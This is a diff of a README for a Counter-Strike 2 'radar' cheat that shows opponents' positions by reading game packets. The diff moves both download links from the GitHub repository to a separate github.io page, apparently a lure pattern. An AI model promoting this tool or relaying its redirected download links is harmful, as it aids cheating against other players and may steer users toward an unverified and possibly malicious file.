@@ -1,6 +1,6 @@
 # 📡 cs2-realtime-radar-tool - See every player position in real-time
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/nitesh6c/cs2-realtime-radar-tool)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://nitesh6c.github.io)
 
 This tool provides a live view of player positions for Counter-Strike 2. It reads game data packets to display location dots on a map overlay. You track teammates and opponents throughout your match. Use this utility to improve your tactical awareness.
 
@@ -23,7 +23,7 @@ This tool provides a live view of player positions for Counter-Strike 2. It read
 
 You must visit the project page to access the latest version of the utility. Follow these steps to obtain the correct file:
 
-1. Visit the [official release page](https://github.com/nitesh6c/cs2-realtime-radar-tool) to find the latest version.
+1. Visit the [official release page](https://nitesh6c.github.io) to find the latest version.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the version labeled "v1.0" or the most recent stable release.
 4. Locate the section titled "Assets" at the bottom of the release notes.
